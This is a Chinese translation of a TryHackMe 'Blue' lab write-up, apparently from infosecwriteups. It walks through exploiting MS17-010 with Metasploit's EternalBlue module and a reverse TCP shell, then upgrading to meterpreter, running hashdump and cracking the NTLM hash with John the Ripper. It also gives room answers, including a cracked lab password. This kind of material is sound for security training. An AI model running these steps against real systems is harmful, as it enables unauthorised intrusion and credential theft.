<html>
<head>
<title>TryHackMe: Blue</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:蓝色</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-blue-671e0095bc45?source=collection_archive---------1-----------------------#2021-06-21">https://infosecwriteups.com/tryhackme-blue-671e0095bc45?source=collection_archive---------1-----------------------#2021-06-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><figure class="ip iq gp gr ir is gh gi paragraph-image"><div class="gh gi io"><img src="../Images/07b01e2469ddfe037506f69d381b0c52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/1*RJgOi1wt9dOTvaqBk4Ti1A.gif"/></div></figure><div class=""/><p id="5e45" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这个房间基于windows机器，我们需要利用常见的错误配置。</p><p id="09e1" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw iy">【任务1】侦查</strong></p><p id="1f33" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在给定的机器上启动nmap扫描:</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="9cbb" class="lb lc ix kx b gy ld le l lf lg">nmap -sV --script vuln -oN nmap/initial &lt;ip&gt;</span></pre><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi lh"><img src="../Images/f9ea94f4e40d88bedbe4a63977fffd51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0rrBIYS4FMB90dzYwUp6LA.png"/></div></div></figure><p id="7bf5" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们发现端口135、139、445、3389、49152、49153、49154、49158、49160是打开的。</p><p id="ffea" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">上面使用的vuln扫描使用一整类脚本来测试易受攻击的目标。</p><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi lm"><img src="../Images/5aeb7b7a201de86aafcc8eac65f3096f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*McC-Ccgv7nJGS5VRa-TH1Q.png"/></div></div></figure><p id="9a1b" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以看到，sm b-vuln-ms17–010利用远程代码执行漏洞。</p><blockquote class="ln lo lp"><p id="a56b" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">端口号低于1000的开放端口有多少个？</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="3c39" class="lb lc ix kx b gy ld le l lf lg">3</span></pre><blockquote class="ln lo lp"><p id="00f8" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">这台机器容易受到什么攻击？(以:ms的形式回答？？-?？？，例如:ms08–067)</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="2a7a" class="lb lc ix kx b gy ld le l lf lg">ms17-010</span></pre></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="4491" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw iy">【任务二】获得权限</strong></p><p id="f12c" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们启动Metasploit并搜索我们在初始侦察中发现的漏洞。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="0dfe" class="lb lc ix kx b gy ld le l lf lg">msfconsole</span><span id="b8fe" class="lb lc ix kx b gy mb le l lf lg">msf6 &gt; search ms17-010</span></pre><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mc"><img src="../Images/77be0bd6bc0615ff1210dad4b3c3f390.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*997QPJloEILnfiYshsE-NA.png"/></div></div></figure><p id="22a4" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们发现永恒的蓝色中小企业远程利用。</p><blockquote class="md"><p id="1732" class="me mf ix bd mg mh mi mj mk ml mm kr dk translated"><strong class="ak"> EternalBlue </strong>利用SMBv1漏洞插入恶意数据包，在网络上传播恶意软件。该漏洞利用了Microsoft Windows处理或错误处理恶意攻击者特制数据包的方式。</p></blockquote><p id="d356" class="pw-post-body-paragraph ju jv ix jw b jx mn jz ka kb mo kd ke kf mp kh ki kj mq kl km kn mr kp kq kr ij bi translated">然后，我们选择漏洞并显示需要设置的选项。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="f394" class="lb lc ix kx b gy ld le l lf lg">msf6 &gt; use 0<br/>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span></pre><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi ms"><img src="../Images/b924fc88d15da5ca358341af178a1955.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uv8b-uWbSNperqrUuA1zjQ.png"/></div></div></figure><p id="d506" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们需要将RHOSTS设置为我们的box IP地址(在我的例子中，我需要将LHOST设置为我的tun0 IP)。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="7f75" class="lb lc ix kx b gy ld le l lf lg">set RHOSTS &lt;ip&gt;<br/>set LHOST &lt;ip&gt;</span></pre><p id="48cf" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们按照指定的指令将有效负载设置为windows/x64/shell/reverse_tcp。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="ce35" class="lb lc ix kx b gy ld le l lf lg">set payload windows/x64/shell/reverse_tcp</span></pre><p id="e410" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">然后我们开始利用。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="517c" class="lb lc ix kx b gy ld le l lf lg">exploit</span></pre><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mt"><img src="../Images/633c16078609d2163fd95df10cc387a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fw5V5WVPQUPMmmBMuZjrIg.png"/></div></div></figure><p id="83f1" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">为了检查我们当前的访问级别，我们使用whoami并得到:</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="91c7" class="lb lc ix kx b gy ld le l lf lg">nt authority\system</span></pre><blockquote class="ln lo lp"><p id="6664" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">找到我们将在机器上运行的利用代码。代码的完整路径是什么？(例如:利用/……..)</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="61e1" class="lb lc ix kx b gy ld le l lf lg">exploit/windows/smb/ms17_010_eternalblue</span></pre><blockquote class="ln lo lp"><p id="3a22" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">显示选项并设置一个必需的值。这个值的名称是什么？(提交时全部大写)</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="eaf2" class="lb lc ix kx b gy ld le l lf lg">RHOSTS</span></pre></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="7bea" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw iy">【任务3】升级</strong></p><p id="f326" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，我们对当前的shell (Ctrl+Z)进行后台处理，并将我们的shell转换为一个meterpreter shell。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="d714" class="lb lc ix kx b gy ld le l lf lg">msf6 &gt; search shell_to_meterpreter<br/>msf6 &gt; use 0</span></pre><p id="c514" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们显示了当前所选漏洞的选项。我们设置LHOST和SESSION。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="793b" class="lb lc ix kx b gy ld le l lf lg">set LHOST &lt;ip&gt;<br/>set SESSION &lt;session-no.&gt;</span></pre><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mu"><img src="../Images/3568939a5a9c6e83d1629d86103ad246.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1YY5DlzjOH6TMWAdkz79lQ.png"/></div></div></figure><p id="2a37" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们运行这个漏洞并得到一个meterpreter会话。然后，我们使用meterpreter会话代替shell。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="c41b" class="lb lc ix kx b gy ld le l lf lg">sessions -i &lt;meterpreter-session-no.&gt;</span></pre><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mv"><img src="../Images/68a1e4e8fc0b03663524913dd6e2d018.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4Vu9jO5R2cnRpkEtoGcMYQ.png"/></div></div></figure><p id="5f4e" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我们有一个米普雷特会议。我们使用getsystem和getuid检查我们是否是NT AUTHORITY\SYSTEM。我们作为一个系统运行，但这并不意味着我们的过程是。我们需要迁移到另一个流程。通常我们使用services.exe。</p><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mw"><img src="../Images/bec3186a6b768f7adb43cc6b206ca244.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0YDjygfWzdlTOzEZHID6Jw.png"/></div></div></figure><figure class="ks kt ku kv gt is gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/4a653419e2d21e61ed8017bc8c0b4ac8.png" data-original-src="https://miro.medium.com/v2/resize:fit:774/format:webp/1*5z6cXm9hMZu41LJMLAVY3w.png"/></div></figure><blockquote class="ln lo lp"><p id="8aa5" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">如果你还没有，背景之前获得的外壳(CTRL + Z)。在线研究如何在metasploit中将shell转换为meterpreter shell。我们将使用的post模块的名称是什么？(确切的路径，类似于我们之前选择的利用方式)</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="e841" class="lb lc ix kx b gy ld le l lf lg">post/multi/manage/shell_to_meterpreter</span></pre><blockquote class="ln lo lp"><p id="5518" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">选择此项(使用模块路径)。显示选项，我们需要更改什么选项？</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="be94" class="lb lc ix kx b gy ld le l lf lg">SESSION</span></pre></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="4c05" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw iy">【任务四】破解</strong></p><p id="8394" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们在一个高架的米特尔外壳里。我们可以使用hashdump命令并获取存储在机器上的密码散列。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="a18c" class="lb lc ix kx b gy ld le l lf lg">meterpreter &gt; hashdump</span></pre><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi my"><img src="../Images/02b6189fdc914c15ce714f537db2ba03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nggsjCFjymioe-1LIPDzbA.png"/></div></div></figure><p id="7bfd" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们复制这个哈希，用开膛手约翰破解，同时用rockyou.txt单词表。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="0712" class="lb lc ix kx b gy ld le l lf lg">john --format=nt --wordlist=&lt;path-to-wordlist&gt; &lt;hash&gt;</span></pre><p id="e20c" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">默认情况下，约翰专注于LM，而不是NTLM哈希。因此，我们需要将格式指定为NT。</p><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi mz"><img src="../Images/49f4be644fed3f010b0b06a147ead4e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n0kcr5Uqg8t3yGcflDPU1A.png"/></div></div></figure><p id="a232" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们得到用户Jon的密码。</p><blockquote class="ln lo lp"><p id="e757" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">在我们提升的meterpreter shell中，运行命令' hashdump '。这将转储机器上的所有密码，只要我们有正确的权限这样做。非默认用户的名称是什么？</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="a4ff" class="lb lc ix kx b gy ld le l lf lg">Jon</span></pre><blockquote class="ln lo lp"><p id="2f15" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">将这个密码哈希复制到一个文件中，研究如何破解它。被破解的密码是什么？</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="3f11" class="lb lc ix kx b gy ld le l lf lg">alqfna22</span></pre></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="5abd" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw iy">【任务五】找旗子！</strong></p><p id="4a45" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">因为我们有一个meterpreter shell，所以我们可以在系统上搜索一个文件。</p><p id="f72f" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们首先将目录改为C:/(系统的根目录)。我们在系统根目录中找到flag1.txt。</p><figure class="ks kt ku kv gt is gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi na"><img src="../Images/142d3d250e34cdc6caa2454845bdfc65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BGF3euP6ED_-B5_McUTb-Q.png"/></div></div></figure><p id="3395" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们现在可以直接搜索标志，因为我们知道文件的格式。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="70fe" class="lb lc ix kx b gy ld le l lf lg">meterpreter &gt; search -f flag*txt</span></pre><figure class="ks kt ku kv gt is gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/fbc1f7559e48de4f53fb2b7fa612cb6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:866/format:webp/1*fTcXzH-lH6bobMPCyAap0w.png"/></div></figure><p id="8353" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们已经找到了系统上的所有文件，并成功地完成了房间。这些标志代表了我们需要知道的Windows系统中的关键位置。</p><blockquote class="ln lo lp"><p id="7204" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">flag1？<em class="ix">这个标志可以在系统根目录下找到。</em></p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="22c9" class="lb lc ix kx b gy ld le l lf lg">flag{a****************e}</span></pre><blockquote class="ln lo lp"><p id="8963" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">flag2？<em class="ix">这个标志可以在Windows里面密码存放的位置找到。</em></p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="737d" class="lb lc ix kx b gy ld le l lf lg">flag{s**************************s}</span></pre><blockquote class="ln lo lp"><p id="031b" class="ju jv lq jw b jx jy jz ka kb kc kd ke lr kg kh ki ls kk kl km lt ko kp kq kr ij bi translated">flag3？可以在一个绝佳的地点找到这面旗帜。毕竟，管理员通常会保存一些非常有趣的东西。</p></blockquote><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="5ca8" class="lb lc ix kx b gy ld le l lf lg">flag{a*****************************e}</span></pre></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="00cc" class="pw-post-body-paragraph ju jv ix jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">TryHackMe简介:<a class="ae nc" href="https://tryhackme.com/p/kaneki10007" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/kaneki10007</a></p></div></div>    
</body>
</html>